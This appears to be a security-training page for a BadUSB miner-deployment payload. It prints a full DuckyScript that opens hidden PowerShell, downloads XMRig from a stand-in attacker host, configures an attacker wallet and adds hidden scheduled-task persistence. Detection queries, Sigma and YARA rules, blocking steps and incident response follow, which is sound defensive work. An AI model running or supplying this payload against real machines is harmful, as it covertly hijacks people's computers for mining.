# EXP-D01: XMRig Miner Deployment

## Classification

| Attribute | Value |
|-----------|-------|
| Payload ID | EXP-D01 |
| Category | Cryptocurrency Mining |
| Target OS | Windows 10/11 |
| Complexity | Expert |
| Risk Level | High |
| MITRE ATT&CK | T1059.001, T1496, T1547.001 |

---

## ⚠️ Legal Warning

This payload is for **AUTHORIZED SECURITY TESTING ONLY**. Deploying cryptocurrency miners without explicit authorization is illegal and may constitute theft of computing resources.

---

## Overview

This payload demonstrates how attackers deploy XMRig-based Monero miners via BadUSB. The payload downloads, configures, and persists a mining operation.

---

## The Payload (Educational Reference)

```
REM ========================================
REM EXP-D01: XMRig Miner Deployment
REM Target: Windows 10/11
REM Purpose: Demonstrate miner deployment for detection training
REM ========================================

REM Initial delay for USB enumeration
DELAY 2000

REM Open Run dialog
GUI r
DELAY 500

REM Launch PowerShell hidden
STRING powershell -w hidden -ep bypass
ENTER
DELAY 1000

REM Stage 1: Create working directory
STRING $dir = "$env:LOCALAPPDATA\Microsoft\Windows\Services"
ENTER
STRING New-Item -ItemType Directory -Path $dir -Force | Out-Null
ENTER
DELAY 300

REM Stage 2: Download miner (simulated staging server)
STRING $miner = "xmrig.exe"
ENTER
STRING $url = "http://attacker-staging-server.example/xmrig.exe"
ENTER
STRING Invoke-WebRequest -Uri $url -OutFile "$dir\$miner" -UseBasicParsing
ENTER
DELAY 2000

REM Stage 3: Create configuration file
STRING $config = @"
ENTER
STRING {
ENTER
STRING     "autosave": true,
ENTER
STRING     "cpu": {"enabled": true, "max-threads-hint": 50},
ENTER
STRING     "pools": [{
ENTER
STRING         "url": "pool.minexmr.com:443",
ENTER
STRING         "user": "ATTACKER_WALLET_ADDRESS",
ENTER
STRING         "pass": "x",
ENTER
STRING         "tls": true
ENTER
STRING     }]
ENTER
STRING }
ENTER
STRING "@
ENTER
STRING $config | Out-File -FilePath "$dir\config.json" -Encoding UTF8
ENTER
DELAY 300

REM Stage 4: Create persistence via scheduled task
STRING $action = New-ScheduledTaskAction -Execute "$dir\$miner" -Argument "-c $dir\config.json"
ENTER
STRING $trigger = New-ScheduledTaskTrigger -AtLogOn
ENTER
STRING $settings = New-ScheduledTaskSettingsSet -Hidden
ENTER
STRING Register-ScheduledTask -TaskName "WindowsServicesHost" -Action $action -Trigger $trigger -Settings $settings | Out-Null
ENTER
DELAY 500

REM Stage 5: Start miner
STRING Start-Process -FilePath "$dir\$miner" -ArgumentList "-c $dir\config.json" -WindowStyle Hidden
ENTER

REM Cleanup
STRING exit
ENTER
```

---

## Line-by-Line Breakdown

### Setup Phase
| Line | Command | Purpose |
|------|---------|---------|
| 1-6 | REM comments | Documentation |
| 8 | DELAY 2000 | Wait for USB enumeration |
| 10-11 | GUI r, DELAY | Open Windows Run dialog |
| 13-15 | STRING...ENTER | Launch hidden PowerShell |

### Payload Deployment Phase
| Line | Command | Purpose |
|------|---------|---------|
| 17-19 | $dir = ... | Create hidden directory |
| 21-25 | Invoke-WebRequest | Download miner binary |
| 27-40 | $config = @"..."@ | Create miner config |
| 42-47 | Register-ScheduledTask | Install persistence |
| 49-50 | Start-Process | Execute miner |

---

## Attack Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                    MINER DEPLOYMENT FLOW                            │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  ┌──────────────┐                                                   │
│  │ BadUSB Insert│                                                   │
│  └──────┬───────┘                                                   │
│         │                                                            │
│         ▼                                                            │
│  ┌──────────────┐    ┌─────────────────────┐                       │
│  │  PowerShell  │───▶│ Create Directory    │                       │
│  │  (Hidden)    │    │ %LOCALAPPDATA%\...  │                       │
│  └──────────────┘    └──────────┬──────────┘                       │
│                                  │                                   │
│                                  ▼                                   │
│                     ┌─────────────────────┐                         │
│                     │ Download XMRig      │                         │
│                     │ From Staging Server │                         │
│                     └──────────┬──────────┘                         │
│                                │                                     │
│                                ▼                                     │
│                     ┌─────────────────────┐                         │
│                     │ Write Config File   │                         │
│                     │ (Pool, Wallet, CPU) │                         │
│                     └──────────┬──────────┘                         │
│                                │                                     │
│                                ▼                                     │
│                     ┌─────────────────────┐                         │
│                     │ Create Scheduled    │                         │
│                     │ Task (Persistence)  │                         │
│                     └──────────┬──────────┘                         │
│                                │                                     │
│                                ▼                                     │
│                     ┌─────────────────────┐                         │
│                     │ Start Mining        │                         │
│                     │ (Connect to Pool)   │                         │
│                     └──────────┬──────────┘                         │
│                                │                                     │
│                                ▼                                     │
│                     ┌─────────────────────┐                         │
│                     │ Cryptocurrency      │                         │
│                     │ to Attacker Wallet  │                         │
│                     └─────────────────────┘                         │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Blue Team: Detection

### Indicators of Compromise (IOCs)

```yaml
File Paths:
  - "%LOCALAPPDATA%\Microsoft\Windows\Services\xmrig.exe"
  - "%LOCALAPPDATA%\Microsoft\Windows\Services\config.json"

Scheduled Task:
  - Name: "WindowsServicesHost"
  - Action: Hidden executable in user directory

Network:
  - Destination: pool.minexmr.com:443
  - Protocol: Stratum over TLS
  - Pattern: Persistent connection with periodic submissions

Process:
  - Name: xmrig.exe
  - High CPU usage (configurable, 50% in this payload)
  - Parent: powershell.exe or scheduled task
```

### Detection Queries

#### Microsoft Defender for Endpoint (KQL)

```kql
// Detect scheduled task creation for miner
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName == "schtasks.exe" or ProcessCommandLine contains "Register-ScheduledTask"
| where ProcessCommandLine contains "WindowsServicesHost" or
        ProcessCommandLine contains "xmrig" or
        ProcessCommandLine contains "config.json"
| project Timestamp, DeviceName, ProcessCommandLine, InitiatingProcessFileName

// Detect connections to mining pools
DeviceNetworkEvents
| where Timestamp > ago(24h)
| where RemoteUrl contains "minexmr" or
        RemoteUrl contains "nanopool" or
        RemoteUrl contains "supportxmr" or
        RemotePort in (3333, 4444, 14444, 14433)
| project Timestamp, DeviceName, RemoteUrl, RemotePort, InitiatingProcessFileName

// Detect high CPU processes
DeviceProcessEvents
| where Timestamp > ago(24h)
| summarize AvgCPU = avg(ProcessCPUUsage) by DeviceName, FileName
| where AvgCPU > 50
| order by AvgCPU desc
```

#### Sigma Rule

```yaml
title: XMRig Miner Deployment via BadUSB
id: exp-d01-xmrig-deploy
status: experimental
description: Detects XMRig miner deployment patterns
author: Security Training
references:
    - Internal Training
logsource:
    product: windows
    service: sysmon
detection:
    selection_process:
        EventID: 1
        Image|endswith: '\xmrig.exe'
    selection_task:
        EventID: 1
        CommandLine|contains:
            - 'Register-ScheduledTask'
            - 'WindowsServicesHost'
    selection_network:
        EventID: 3
        DestinationPort:
            - 3333
            - 4444
            - 14444
    selection_config:
        EventID: 11
        TargetFilename|contains:
            - '\config.json'
            - '\xmrig'
    condition: selection_process or selection_task or selection_network or selection_config
level: high
tags:
    - attack.resource_hijacking
    - attack.t1496
```

### YARA Rule

```yara
rule XMRig_Miner_Detection
{
    meta:
        description = "Detects XMRig cryptocurrency miner"
        author = "Security Training"
        date = "2024-01-01"
        
    strings:
        $xmrig1 = "xmrig" ascii nocase
        $xmrig2 = "XMRig" ascii
        $pool1 = "pool.minexmr" ascii
        $pool2 = "nanopool.org" ascii
        $pool3 = "supportxmr.com" ascii
        $stratum1 = "stratum+tcp://" ascii
        $stratum2 = "stratum+ssl://" ascii
        $config1 = "\"pools\":" ascii
        $config2 = "\"cpu\":" ascii
        $donate = "--donate-level" ascii
        
    condition:
        uint16(0) == 0x5A4D and
        (2 of ($xmrig*) or any of ($pool*) or all of ($stratum*)) or
        (all of ($config*) and $donate)
}
```

---

## Blue Team: Prevention

### USB Device Control

```powershell
# Block unknown USB HID devices via GPO
$regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceInstall\Restrictions"
New-Item -Path $regPath -Force

# Deny unknown devices
Set-ItemProperty -Path $regPath -Name "DenyUnspecified" -Value 1 -Type DWord

# Block known BadUSB VIDs
$denyPath = "$regPath\DenyDeviceIDs"
New-Item -Path $denyPath -Force
Set-ItemProperty -Path $denyPath -Name "1" -Value "USB\VID_0483*" -Type String  # Flipper
```

### Network Blocking

```powershell
# Block common mining pool ports
$ports = 3333, 3334, 4444, 14444, 14433
foreach ($port in $ports) {
    New-NetFirewallRule -DisplayName "Block Mining Port $port" `
        -Direction Outbound -LocalPort $port -Protocol TCP -Action Block
}

# Block known pool domains via hosts file
$pools = @(
    "pool.minexmr.com",
    "xmr.nanopool.org",
    "supportxmr.com",
    "monerohash.com"
)
foreach ($pool in $pools) {
    Add-Content "C:\Windows\System32\drivers\etc\hosts" "0.0.0.0 $pool"
}
```

### Application Whitelisting

```xml
<!-- WDAC Rule to Block Miners -->
<FileRules>
    <Deny ID="ID_DENY_XMRIG" FriendlyName="Block XMRig"
          FileName="xmrig*.exe" />
    <Deny ID="ID_DENY_CPUMINER" FriendlyName="Block CPUMiner"
          FileName="*miner*.exe" />
</FileRules>
```

---

## Blue Team: Response

### Immediate Response Steps

```
1. CONFIRM (5 minutes)
   □ Verify mining process is running
   □ Check CPU usage
   □ Confirm pool connections

2. CONTAIN (10 minutes)
   □ Kill mining process: taskkill /F /IM xmrig.exe
   □ Block pool at firewall
   □ Isolate system if widespread

3. ERADICATE (30 minutes)
   □ Delete miner binary: del /F %LOCALAPPDATA%\...\xmrig.exe
   □ Delete config file: del /F %LOCALAPPDATA%\...\config.json
   □ Remove scheduled task: Unregister-ScheduledTask -TaskName "WindowsServicesHost"
   □ Check for additional persistence

4. VERIFY (15 minutes)
   □ Full AV scan
   □ Check task scheduler
   □ Monitor network for pool connections
   □ Check other systems for IOCs
```

### Forensic Collection

```powershell
# Collect evidence before remediation
$evidenceDir = "C:\Forensics\Miner_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
New-Item -ItemType Directory -Path $evidenceDir

# Capture running processes
Get-Process | Export-Csv "$evidenceDir\processes.csv"

# Capture network connections
Get-NetTCPConnection | Export-Csv "$evidenceDir\connections.csv"

# Capture scheduled tasks
Get-ScheduledTask | Export-Csv "$evidenceDir\tasks.csv"

# Copy miner files (if still present)
Copy-Item "$env:LOCALAPPDATA\Microsoft\Windows\Services\*" $evidenceDir -Force

# Calculate hashes
Get-ChildItem $evidenceDir | ForEach-Object {
    $hash = Get-FileHash $_.FullName -Algorithm SHA256
    "$($hash.Hash)  $($_.Name)" | Out-File "$evidenceDir\hashes.txt" -Append
}
```

---

## Summary

| Aspect | Details |
|--------|---------|
| Attack Technique | Cryptocurrency miner deployment via BadUSB |
| Persistence | Scheduled task at user logon |
| Evasion | Hidden window, system-like directory |
| Impact | Resource theft, power costs, system slowdown |
| Detection | CPU monitoring, network traffic, process names |
| Prevention | USB control, application whitelisting, network blocking |

---

[← Expert Ducky](./README.md) | [Next: Stealth Miner →](./EXP-D02_Stealth_Miner.md)
